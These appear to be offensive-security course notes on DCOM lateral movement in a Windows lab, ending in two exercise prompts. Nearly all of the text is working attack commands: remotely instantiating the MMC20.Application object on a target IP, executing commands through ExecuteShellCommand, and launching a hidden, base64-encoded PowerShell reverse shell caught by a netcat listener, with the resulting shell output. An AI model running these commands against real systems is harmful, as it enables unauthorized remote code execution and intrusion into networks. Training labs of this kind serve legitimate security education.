# DCOM

Remotely Instantiating the MMC Application object
>``` shell
>$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
>```

Executing a command on the remote DCOM object
>``` shell
>$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
>```

Verifying that calculator is running on FILES04
>``` shell
>C:\Users\Administrator>tasklist | findstr "calc"
>
># ========== Expected Result ==========
>win32calc.exe                 4764 Services                   0     12,132 K
># =====================================
>```

Adding a reverse-shell as a DCOM payload on CLIENT74
>``` shell
>$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
>AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
>```

Obtaining a reverse-shell through DCOM lateral movement
>``` shell
>kali@kali:~$ nc -lnvp 443
>
># ========== Expected Result ==========
>listening on [any] 443 ...
>connect to [192.168.118.2] from (UNKNOWN) [192.168.50.73] 50778
># =====================================
>
>PS C:\Windows\system32> whoami
>
># ========== Expected Result ==========
>corp\jen
># =====================================
>
>PS C:\Windows\system32> hostname
>
># ========== Expected Result ==========
>FILES04
># =====================================
>```

Lab 1 - Start VM Group 1 and repeat the steps discussed in this section. Which MMC method accepts command shell arguments?
>``` shell
>
>```
>

Lab 2 - Start VM Group 2 and connect as the jen user on client74 then try to abuse DCOM to move laterally to web04 to get the flag located on the administrator's desktop.
>``` shell
>
>```
>
